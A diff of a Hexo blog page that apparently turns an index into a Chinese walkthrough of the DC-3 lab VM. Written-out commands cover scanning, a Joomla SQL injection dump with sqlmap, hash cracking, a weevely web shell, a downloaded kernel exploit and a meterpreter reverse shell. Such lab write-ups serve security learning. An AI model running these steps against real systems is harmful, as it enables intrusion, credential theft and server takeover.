@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>violin&#39;s blog</title>
+    <title>DC-3 · violin&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -77,6 +77,8 @@
 
     <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
     <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -201,14 +203,23 @@
 </head>
 
     
-        <body class="home-body">
+        <body class="post-body">
     
     
-<header class="header index-header">
+<header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >violin</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">DC-3</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>violin</a>
 </header>
@@ -227,17 +238,17 @@ height:50vh;
     <!-- 主页  -->
     
     
-    <!-- 文章页  -->
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/index-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            violin
-            <!-- 文章页  -->
+            DC-3
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
@@ -245,12 +256,44 @@ height:50vh;
             <!-- 主页副标题  -->
             
             
-                三里清风三里路，步步清风再无你
-            
-            <!-- 文章页  -->
+            <!-- 404 -->
             
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "靶机">靶机</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">835</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/09/26</span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -351,187 +394,132 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/07/10/redis-未授权RCE复现/" >
-            
-                <span>redis 未授权RCE复现</span>
-        </a>
-        <div class="abstract-content">
-            <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本人使用Ubuntu进行搭建</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-5.0.0.tar.gz</span><br><span class="line">tar xzf redis-5.0.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-5.0.0</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="DC3"><a href="#DC3" class="headerlink" title="DC3"></a>DC3</h2><p>同样先<code>netdiscover</code>扫一波，找到目标：</p>
+<p><code>netdiscover -P -r 192.168.190.1/24</code><a id="more"></a></p>
+<img src="/2019/09/26/DC-3/1569414911173.png" title="dc3"> 
 
-<p>编译完成之后修改<code>redis.conf</code>，将127.0.0.1改为0.0.0.0
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/10</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞利用">漏洞利用</a>
-    
-</div>
-            
-        </div>
+<p>然后<code>nmap</code>一波，看看开了什么服务：</p>
+<p><code>nmap -sSV -p- 192.168.190.131</code></p>
+<img src="/2019/09/26/DC-3/1569415028194.png" title="dc3"> 
+
+<p>除了80（HTTP）一无所获，所以访问一看试试：</p>
+<img src="/2019/09/26/DC-3/1569415117714.png" title="dc3"> 
+
+<p>一个登录页面，提示说只有一个flag，而且需要服务器的root权限才能获得，没有其他的线索了，看看源代码能不能获取一点信息：</p>
+<img src="/2019/09/26/DC-3/1569415318378.png" title="dc3"> 
+
+<p>用joomla搭建的站，然后尝试扫扫目录试试：</p>
+<p><code>dirb http://192.168.190.131/</code></p>
+<img src="/2019/09/26/DC-3/1569415431008.png" title="dc3"> 
+
+<p>发现一堆admin的页面，访问看看:</p>
+<img src="/2019/09/26/DC-3/1569415565018.png" title="dc3"> 
+
+<p>后台登陆入口，但是不存在弱口令。然后用joomscan扫一波试试，但是我的kali中没有，安装一下吧：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rezasp/joomscan.git</span><br><span class="line"><span class="built_in">cd</span> joomscan</span><br><span class="line">perl joomscan.pl</span><br></pre></td></tr></table></figure>
+
+<p>开始扫描<code>perl joomscan.pl -u http://192.168.190.131</code></p>
+<img src="/2019/09/26/DC-3/1569415902499.png" title="dc3"> 
+
+<p>获取到一个版本号，和一个之前发现的管理员页面，有了版本号尝试去<code>searchsploit</code>搜搜看：</p>
+<img src="/2019/09/26/DC-3/1569416000074.png" title="dc3"> 
+
+<p>成功获取到一个sql注入漏洞，看看这个SQL注入怎么个注入法吧</p>
+<p><code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</code></p>
+<img src="/2019/09/26/DC-3/1569416188848.png" title="dc3"> 
+
+<p>其中说明了注入点，以及<code>SQLMAP</code>的语句都已经给出了，然后试试看看能出什么数据：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.190.131/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
+
+<img src="/2019/09/26/DC-3/1569416409397.png" title="dc3"> 
+
+<p>存在注入，然后就是出数据了，爆user表，拿用户名，密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.190.131/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables</span><br><span class="line">sqlmap -u <span class="string">"http://192.168.190.131/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T <span class="string">"#__users"</span> --columns --dump</span><br></pre></td></tr></table></figure>
+
+<img src="/2019/09/26/DC-3/1569420799673.png" title="dc3"> 
+
+<p>成功获取到admin的密码，但是加密了，此时就需要用到我们的<code>hashcat</code>进行一波破解了,成功破解获得密码snoopy，登陆后台，发现在模板那儿能对文件进行浏览，而且还能新建编辑，当然选择写一个shell了：</p>
+<img src="/2019/09/26/DC-3/1569426222618.png" title="dc3"> 
+
+<p>用weevely生成一个shell，然后将其保存到新建的文件当中：</p>
+<img src="/2019/09/26/DC-3/1569426293806.png" title="dc3"> 
+
+<p>然后nc起一个监听，然后连接：</p>
+<p><code>weevely http://192.168.190.131/templates/beez3/shell.php v</code></p>
+<p>成功获取到一个shell:</p>
+<img src="/2019/09/26/DC-3/1569426367989.png" title="dc3"> 
+
+<p>尝试进入root，失败，接下来就是提权了：</p>
+<img src="/2019/09/26/DC-3/1569426456255.png" title="dc3"> 
+
+<p>首先查看一下内核版本，为linux 4.4.0： </p>
+<img src="/2019/09/26/DC-3/1569426627887.png" title="dc3"> 
+
+<p>用searchsploit看看有什么漏洞没有：</p>
+<img src="/2019/09/26/DC-3/1569426705771.png" title="dc3"> 
+
+<p>果然存在一个权限提升的漏洞，查看一下利用方式：</p>
+<img src="/2019/09/26/DC-3/1569426829423.png" title="dc3"> 
+
+<p>尝试获取一下这个文件，在/tmp目录下进行获取：</p>
+<p><code>wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</code></p>
+<img src="/2019/09/26/DC-3/1569426988757.png" title="dc3"> 
+
+<p>然后就是解压、编译、执行提权：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unzip 39772.zip</span><br><span class="line"><span class="built_in">cd</span> 39772</span><br><span class="line">tar -xf exploit.tar</span><br><span class="line"><span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br><span class="line">./compile.sh</span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure>
+
+<p>其中在编译的过程中会出现错误，忽略就好，最后执行，发现无法返回shell，再执行发现出错：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC3VM:/tmp/39772/ebpf_mapfd_doubleput_exploit $ ./doubleput</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line">fuse: mountpoint is not empty</span><br><span class="line">fuse: <span class="keyword">if</span> you are sure this is safe, use the <span class="string">'nonempty'</span> mount option</span><br><span class="line">doubleput: system() failed</span><br><span class="line">doubleput: child quit before we got a good file*</span><br></pre></td></tr></table></figure>
+
+<p>然后怎么做都不行，于是我通过<code>weevly</code>派生一个<code>meterpreter</code>：</p>
+<p><code>backdoor_meterpreter -lhost 192.168.190.129</code></p>
+<p>接着运行如下的命令，成功获得<code>meterpreter</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -x <span class="string">"use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST 192.168.190.129; set PORT 4444; run"</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2019/09/26/DC-3/1569429106148.png" title="dc3"> 
+
+<p>然后再次运行，还是失败，但是发现已经是root权限了：</p>
+<img src="/2019/09/26/DC-3/1569429168885.png" title="dc3"> 
+
+<p>最后成功获得flag ：</p>
+<img src="/2019/09/26/DC-3/1569429192977.png" title="dc3"> 
+
+
     </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/07/09/提权学习（一）/" >
-            
-                <span>提权学习（一）</span>
-        </a>
-        <div class="abstract-content">
-            <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>常用的windows信息收集命令：<code>systeminfo</code> 、<code>ipconfig /all</code>、<code>net user</code>、<code>whoami</code>、<code>netstat -an</code> </p>
-<p>通过服务器所打的补丁判断可能存在的漏洞，准备提权工具（PR），然后寻找一个可写的目录将工具上传到服务器。
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/09</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "提权">提权</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/07/08/imgtest/" >
-            
-                <span>hexo写文章教程</span>
-        </a>
-        <div class="abstract-content">
-            <p>hexo写博客文章简易教程
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/08</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "hexo">hexo</a>
-    
-</div>
-            
-        </div>
-    </article>
+    <!-- license  -->
     
     <!-- paginator  -->
-    
-    <nav class="page-nav">
-        <a class="extend prev" rel="prev" href="/">&#60; PREV</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
-    </nav>
-    
-</main>
-            <!-- profile -->
+    <ul class="post-paginator">
+        <li class="next">
             
-            <div class="profile">
-    <img class="profile-avatar" alt="avatar" src= /avatar/violin.jpg >
-    <div class="profile-name">violin</div>
-    
-    <div class="profile-signature">
-        成为你的盖世英雄
-    </div>
-    
-    
-    <div class="profile-social">
-        
-    
-        
+        </li>
+        <li class="previous">
             
-                <a href="mailto:tianzhiwei_v@163.com" class="iconfont-archer email" title=email ></a>
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/09/24/DC-2/" title= "DC-2">
+                    <div class="prevTitle">DC-2</div>
+                </a>
             
-        
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-        
-            
-                <a href="//github.com/993286924/" class="iconfont-archer github" target="_blank" title=github></a>
-            
-        
     
-        
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
     
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
     
 
-    </div>
-    
-    
-        <div class="friends">
-            <div>FRIENDS</div>
-            
-                
-                    <span>
-                        <a href= //www.sec0pen.com.cn target="_black">violin</a>
-                    </span>
-                
-            
-        </div>
-    
-    
-        <div class="about-me">
-            <a href = "/about" >ABOUT ME</a>
-        </div>
-    
-</div>
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
             
         </div>
         <footer class="footer footer-unloaded">
@@ -598,6 +586,24 @@ height:50vh;
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DC3"><span class="toc-number">1.</span> <span class="toc-text">DC3</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -909,6 +915,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
